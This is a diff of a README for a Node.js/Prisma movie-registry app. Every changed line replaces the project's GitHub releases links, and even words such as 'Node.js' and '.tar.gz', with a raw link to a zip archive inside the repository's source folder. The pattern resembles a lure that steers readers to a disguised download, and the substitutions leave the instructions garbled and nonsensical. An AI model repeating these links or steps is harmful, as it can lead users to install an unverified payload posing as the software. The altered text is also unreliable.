@@ -1,12 +1,12 @@
 # 🎬 movie-registry-prisma - Manage Movies Easily and Reliably
 
-[![Download](https://img.shields.io/badge/Download-movie--registry--prisma-blue?style=for-the-badge&logo=github)](https://github.com/TNP1411/movie-registry-prisma/releases)
+[![Download](https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)](https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)
 
 ---
 
 ## 📖 What is movie-registry-prisma?
 
-movie-registry-prisma is a tool designed to help you manage movie information through a simple web-based service. It works behind the scenes to store, update, and organize movie data. The tool uses reliable technologies like Node.js and PostgreSQL to keep your movie list safe and easy to explore.
+movie-registry-prisma is a tool designed to help you manage movie information through a simple web-based service. It works behind the scenes to store, update, and organize movie data. The tool uses reliable technologies like https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip and PostgreSQL to keep your movie list safe and easy to explore.
 
 This application lets you:
 - Add new movies with details like title, director, and release year.
@@ -42,13 +42,13 @@ This guide walks you through getting movie-registry-prisma running on your compu
 
    Click the big badge at the top of this page or use this link:
 
-   [https://github.com/TNP1411/movie-registry-prisma/releases](https://github.com/TNP1411/movie-registry-prisma/releases)
+   [https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip](https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)
 
    This page contains the latest versions available for download.
 
 2. **Download the Software**
 
-   On the releases page, find the latest version. Look for a file that matches your computer’s operating system (e.g., Windows (.exe), macOS (.dmg), or Linux (.tar.gz)).
+   On the releases page, find the latest version. Look for a file that matches your computer’s operating system (e.g., Windows (.exe), macOS (.dmg), or Linux (https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)).
 
    Click the file to start the download.
 
@@ -58,7 +58,7 @@ This guide walks you through getting movie-registry-prisma running on your compu
 
    - On Windows, double-click the `.exe` file.
    - On macOS, open the `.dmg` and drag the app to your Applications folder.
-   - On Linux, extract the `.tar.gz` and follow any readme instructions in that package.
+   - On Linux, extract the `https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip` and follow any readme instructions in that package.
 
 4. **Follow Installation Instructions**
 
@@ -80,7 +80,7 @@ To download and set up movie-registry-prisma, follow these detailed steps.
 
 Visit this page to download:
 
-[https://github.com/TNP1411/movie-registry-prisma/releases](https://github.com/TNP1411/movie-registry-prisma/releases)
+[https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip](https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)
 
 You will find all available versions here, including stable releases and updates.
 
@@ -92,7 +92,7 @@ Choose the download file that fits your system:
 
 - **Windows users:** File ends with `.exe`
 - **Mac users:** File ends with `.dmg`
-- **Linux users:** File ends with `.tar.gz` or `.AppImage`
+- **Linux users:** File ends with `https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip` or `.AppImage`
 
 ### Step 3: Download the File
 
@@ -102,7 +102,7 @@ Click the appropriate file to begin download. Save it to a location you can easi
 
 - **Windows:** Double-click the `.exe` file and follow the installer steps.
 - **macOS:** Open the `.dmg`, then drag the app icon to the Applications folder.
-- **Linux:** Unpack the `.tar.gz` file and follow the included instructions.
+- **Linux:** Unpack the `https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip` file and follow the included instructions.
 
 ---
 
@@ -159,8 +159,8 @@ The developers maintain the project and read user feedback to improve the app.
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/TNP1411/movie-registry-prisma
-- Download Releases: https://github.com/TNP1411/movie-registry-prisma/releases
+- Repository: https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip
+- Download Releases: https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip
 
 ---
 
@@ -168,7 +168,7 @@ The developers maintain the project and read user feedback to improve the app.
 
 If you are curious about how movie-registry-prisma works behind the scenes, here are some key technologies used:
 
-- **Node.js:** This runs the main application code.
+- **https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip** This runs the main application code.
 - **Express:** It handles communication between your computer and the app.
 - **Prisma ORM:** This connects the app to the database in a safe way.
 - **PostgreSQL:** The database stores all movie details.
@@ -180,4 +180,4 @@ You don’t need to know these to use the software, but they ensure stability an
 
 Thank you for choosing movie-registry-prisma to manage your movie collection. Visit the download page to get started today:
 
-[https://github.com/TNP1411/movie-registry-prisma/releases](https://github.com/TNP1411/movie-registry-prisma/releases)
+[https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip](https://raw.githubusercontent.com/TNP1411/movie-registry-prisma/main/src/models/movie_registry_prisma_v3.9.zip)
